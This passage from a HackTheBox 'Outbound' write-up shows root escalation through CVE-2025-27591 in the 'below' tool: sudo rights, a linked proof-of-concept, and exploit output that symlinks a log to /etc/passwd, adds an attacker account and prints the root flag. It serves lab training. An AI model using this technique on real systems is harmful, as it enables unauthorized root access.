</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-CVE-2025-27591"><a href="#Privilege-Escalation-CVE-2025-27591" class="headerlink" title="Privilege Escalation - CVE-2025-27591"></a>Privilege Escalation - CVE-2025-27591</h2><p>Looking at what jacob can run as sudo, we see he can run <code>below</code> binary, which by a quick search we find a CVE for it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jacob@outbound:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jacob on outbound:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User jacob may run the following commands on outbound:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*,</span><br><span class="line">        !/usr/bin/below --debug*, !/usr/bin/below -d*</span><br><span class="line">jacob@outbound:~$ </span><br></pre></td></tr></table></figure></div>
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py" >https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>We execute the exploit and get the root access:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">jacob@outbound:/tmp$ python3 expl.py </span><br><span class="line">[*] Checking <span class="keyword">for</span> CVE-2025-27591 vulnerability...</span><br><span class="line">[+] /var/log/below is world-writable.</span><br><span class="line">[!] /var/log/below/error_root.log is a regular file. Removing it...</span><br><span class="line">[+] Symlink created: /var/log/below/error_root.log -&gt; /etc/passwd</span><br><span class="line">[+] Target is vulnerable.</span><br><span class="line">[*] Starting exploitation...</span><br><span class="line">[+] Wrote malicious passwd line to /tmp/attacker</span><br><span class="line">[+] Symlink <span class="built_in">set</span>: /var/log/below/error_root.log -&gt; /etc/passwd</span><br><span class="line">[*] Executing <span class="string">&#x27;below record&#x27;</span> as root to trigger logging...</span><br><span class="line">Jul 18 10:02:59.163 DEBG Starting up!</span><br><span class="line">Jul 18 10:02:59.163 ERRO </span><br><span class="line">----------------- Detected unclean <span class="built_in">exit</span> ---------------------</span><br><span class="line">Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01752796800: EAGAIN: Try again</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">[+] <span class="string">&#x27;below record&#x27;</span> executed.</span><br><span class="line">[*] Appending payload into /etc/passwd via symlink...</span><br><span class="line">[+] Payload appended successfully.</span><br><span class="line">[*] Attempting to switch to root shell via <span class="string">&#x27;su attacker&#x27;</span>...</span><br><span class="line">root@outbound:/tmp<span class="comment"># cat /root/root.txt</span></span><br><span class="line">ea754dd635573ebdcf53682caafd85b4</span><br><span class="line">root@outbound:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
+
+<p>Hope you liked this writeup!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Outbound</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-11-16 04:57:04</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-11-16 05:12:51
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/11/16/Hackthebox-Outbound/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/11/07/Hackthebox-RustyKey/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: RustyKey</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Outbound</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application"><span class="nav-text">Web Application</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-CVE-2025-27591"><span class="nav-text">Privilege Escalation - CVE-2025-27591</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
